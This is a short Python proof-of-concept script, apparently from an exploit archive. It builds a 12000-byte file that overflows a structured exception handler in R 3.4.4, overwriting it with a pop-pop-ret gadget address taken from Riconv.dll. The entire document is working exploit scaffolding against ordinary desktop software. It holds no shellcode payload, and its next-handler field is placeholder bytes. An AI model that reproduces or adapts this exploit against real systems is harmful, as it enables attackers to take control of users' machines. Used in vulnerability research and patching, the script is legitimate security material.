#!/usr/bin/python

import struct

filename="r344.txt"

nSEH = "B" * 4
SEH  = struct.pack("<I", 0x643c236e) # 0x643c236e : pop esi # pop edi # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} - (C:\Program Files\R\R-3.4.4\bin\i386\Riconv.dll)

buffer  = "A" * 900
buffer += nSEH
buffer += SEH
buffer += "D" * (12000 - len(buffer))

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()


